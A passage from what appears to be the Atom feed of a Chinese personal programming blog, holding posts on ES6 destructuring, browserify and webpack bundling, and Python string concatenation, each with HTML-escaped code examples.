&lt;p&gt;可以通过留空来对解构的值用变量赋值：&lt;br&gt;&lt;figure class=&quot;highlight prolog&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let [, , gender] = [&lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;man&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还可以通过可变参数对进行赋值：&lt;br&gt;&lt;figure class=&quot;highlight dns&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let [a, ...b] = [&lt;span class=&quot;number&quot;&gt;1,2,3,4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(a, b)&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, [&lt;span class=&quot;number&quot;&gt;2,3,4,5&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果我们的解构结构(读起来都点绕口)的变量对应的值为空的话，那么这个变量的值为undefined，这个时候可以给变量指定一个默认的值:&lt;br&gt;&lt;figure class=&quot;highlight xl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let [&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;] = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;let [&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;] = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//&#39;summer&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当对除数组外，其他的数据类型进行解构，会报错：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &lt;span class=&quot;literal&quot;&gt;NaN&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; [foo] = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;对对象的解构&quot;&gt;&lt;a href=&quot;#对对象的解构&quot; class=&quot;headerlink&quot; title=&quot;对对象的解构&quot;&gt;&lt;/a&gt;对对象的解构&lt;/h3&gt;&lt;p&gt;通常，我们对对象的解构有两种写法：&lt;br&gt;&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let &amp;#123;name, age&amp;#125; = &amp;#123;&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;age:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;let &amp;#123;&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt; nameA, &lt;span class=&quot;string&quot;&gt;age:&lt;/span&gt; ageA&amp;#125; = &amp;#123;&lt;span class=&quot;string&quot;&gt;name:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;age:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上面两种写法取决你是否需要将变量名变的和属性名一样。&lt;br&gt;对对象的解构在有些方面的写法和对数组的解构类似：&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;// 对空对象的解构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &amp;#123;name&amp;#125; = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &amp;#123;name, &amp;#123;address, [likes1, likes2]&amp;#125;&amp;#125; = &amp;#123;name: &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, details: &amp;#123;address: &lt;span class=&quot;string&quot;&gt;&#39;Jiangxi China&#39;&lt;/span&gt;, likes: [&lt;span class=&quot;string&quot;&gt;&#39;play basketball&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;listen music&#39;&lt;/span&gt;]&amp;#125;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(name, address, likes1, likes2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;Jiangxi China&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;play basketball&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;listen music&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当尝试解构null或undefined的时候，就会报错：&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;decorator&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;span class=&quot;decorator&quot;&gt;name&amp;#125; = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// &lt;span class=&quot;built_in&quot;&gt;TypeError&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; has no properties&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当解构原始数据类型，将得到undefined.&lt;br&gt;&lt;figure class=&quot;highlight xl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;let &amp;#123;&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;&amp;#125; = &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;name&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;ECMAScript6解构表达式&lt;/strong&gt; 允许你使用类似数组或对象字面量的方式将数组和对象的属性赋值给变量。这种赋值语句非常简洁明了,我们可以用解构表达式来帮助我们书写更加“清晰”的代码。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="ESMAScript6" scheme="http://summerGreenTea.github.io/tags/ESMAScript6/"/>
    
  </entry>
  
  <entry>
    <title>学习javascript 模块化的总结(二)</title>
    <link href="http://summerGreenTea.github.io/2015/12/06/js-modularization-programming2/"/>
    <id>http://summerGreenTea.github.io/2015/12/06/js-modularization-programming2/</id>
    <published>2015-12-06T04:06:20.000Z</published>
    <updated>2016-03-02T15:00:22.673Z</updated>
    
    <content type="html">&lt;p&gt;前文简单的总结了下前端模块化的一些发展历程和CommonJS规范、AMD规范以及一些模块加载库的实现，这篇文章将介绍下&lt;strong&gt;browserify&lt;/strong&gt;和&lt;strong&gt;webpack&lt;/strong&gt;及以用法。当然，前端模块化最让人惊喜的莫过于ES6的模块化加载方案，后续学习时，也会在ES6学习系列的文章中总结一下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;h3 id=&quot;browserify&quot;&gt;&lt;a href=&quot;#browserify&quot; class=&quot;headerlink&quot; title=&quot;browserify&quot;&gt;&lt;/a&gt;browserify&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;browserify&lt;/strong&gt;是一个使用node.js编写的模块管理器，你可以使用类似于node.js中的require()来在我们的项目中引入你想要依赖或者使用的模块。browserify托管在npm上，可以使用:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm install browserify -g
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;来安装browserify。那么如何使用browserify呢，下面通过一小段代码来感受一下:&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// a.js&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;a&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;modules.export = a;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight gcode&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// b.js&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var a = require&lt;span class=&quot;comment&quot;&gt;(&#39;./a.js&#39;)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a&lt;span class=&quot;comment&quot;&gt;()&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;browserify b.js -o bundle.js
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;来将b.js的代码和b.js中reuqire进来的模块进行打包进一个文件(bundle.js)中。&lt;/p&gt;
&lt;h3 id=&quot;webpack&quot;&gt;&lt;a href=&quot;#webpack&quot; class=&quot;headerlink&quot; title=&quot;webpack&quot;&gt;&lt;/a&gt;webpack&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;webpack&lt;/strong&gt;的出现让前端开发重新定义了模块这一词儿。在webpack中，css、图片等静态资源都可以被打包成模块。webpack还支持在模块打包时的插件处理机制。在工程的根目录下新建&lt;strong&gt;webpack.config.js&lt;/strong&gt;文件，在文件中配置相关的选项:&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// webpack.config.js&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;module&lt;/span&gt;.exports = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;entry&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;./entry.js&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;output&lt;/span&gt;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attribute&quot;&gt;path&lt;/span&gt;: __dirname,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attribute&quot;&gt;filename&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;bundle.js&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;module&lt;/span&gt;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;attribute&quot;&gt;loaders&lt;/span&gt;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123; &lt;span class=&quot;attribute&quot;&gt;test&lt;/span&gt;: /\.css$/, &lt;span class=&quot;attribute&quot;&gt;loader&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;style!css&quot;&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在module.loaders中，我们使用了&lt;code&gt;style&lt;/code&gt;和&lt;code&gt;css&lt;/code&gt;两个loader来帮我们处理在浏览器中加载css文件。在webpack社区中，开源的各种插件已经足够满足我们日常的开发需求。其实细细去挖webpack的东西发现，其实还是一大堆的插件的使用方式balabala的，不如我们带上webpack的好基友React一起来说下吧。&lt;/p&gt;
&lt;p&gt;webpack的到来简直是让React如虎添翼,其核心的功能与作用则和React中的组件化的思想完美契合，并且使用babel-loader来支持React的jsx语法，webpack还支持Hot Loading Component让你不用忍受页面刷来刷去的痛苦。简单的几个loaders一配置，一键搞定。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前文简单的总结了下前端模块化的一些发展历程和CommonJS规范、AMD规范以及一些模块加载库的实现，这篇文章将介绍下&lt;strong&gt;browserify&lt;/strong&gt;和&lt;strong&gt;webpack&lt;/strong&gt;及以用法。当然，前端模块化最让人惊喜的莫过于ES6的模块化加载方案，后续学习时，也会在ES6学习系列的文章中总结一下。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>python笔记-python中的字符串拼接</title>
    <link href="http://summerGreenTea.github.io/2015/12/03/python-str-concat/"/>
    <id>http://summerGreenTea.github.io/2015/12/03/python-str-concat/</id>
    <published>2015-12-03T14:17:22.000Z</published>
    <updated>2016-03-02T02:58:00.395Z</updated>
    
    <content type="html">&lt;p&gt;这些天在利用零零碎碎的一些时间在学习python，发现了python这门语言在一定程度上很想javascript。都是弱类型、动态语言，都支持高阶函数(还有我看到了&lt;code&gt;闭包&lt;/code&gt;)，写法非常灵活，一上手觉得写起来非常舒服。python中管字符串类型叫&lt;code&gt;str&lt;/code&gt;，而不是大众化的&lt;code&gt;String&lt;/code&gt;，同样，它也是python中的一种对象，在python中&lt;code&gt;str&lt;/code&gt;的写法非常灵活(pythoner管这个叫优雅):)，特别是字符串的拼接拼接，其方法之丰富，让我对python这门语言有了很大的好感，这篇博文就是总结下python中的&lt;code&gt;str&lt;/code&gt; 字符串拼接。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;个人使用的&lt;code&gt;python 3.4&lt;/code&gt;版本，所以后面的代码实例也会使用python3的版本代码来说明。&lt;/p&gt;
&lt;h3 id=&quot;字符串拼接方式&quot;&gt;&lt;a href=&quot;#字符串拼接方式&quot; class=&quot;headerlink&quot; title=&quot;字符串拼接方式&quot;&gt;&lt;/a&gt;字符串拼接方式&lt;/h3&gt;&lt;p&gt;下面来介绍python3中字符串的拼接方式。&lt;/p&gt;
&lt;h4 id=&quot;利用加号进行拼接&quot;&gt;&lt;a href=&quot;#利用加号进行拼接&quot; class=&quot;headerlink&quot; title=&quot;利用加号进行拼接&quot;&gt;&lt;/a&gt;利用加号进行拼接&lt;/h4&gt;&lt;p&gt;这个方法我们在很多语言都看到过，这种方式也是最简单也是最直接的字符串拼接方法：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;//coding &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; python3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;s = &lt;span class=&quot;string&quot;&gt;&quot;I love &quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;python&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;s&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;I love python&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;在字符串之间加上任意数量空格或者什么都不加&quot;&gt;&lt;a href=&quot;#在字符串之间加上任意数量空格或者什么都不加&quot; class=&quot;headerlink&quot; title=&quot;在字符串之间加上任意数量空格或者什么都不加&quot;&gt;&lt;/a&gt;在字符串之间加上任意数量空格或者什么都不加&lt;/h4&gt;&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;I love &quot;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;python&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;I love python&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;I love&quot;&lt;/span&gt;    &lt;span class=&quot;string&quot;&gt;&quot;python&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;I love python&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
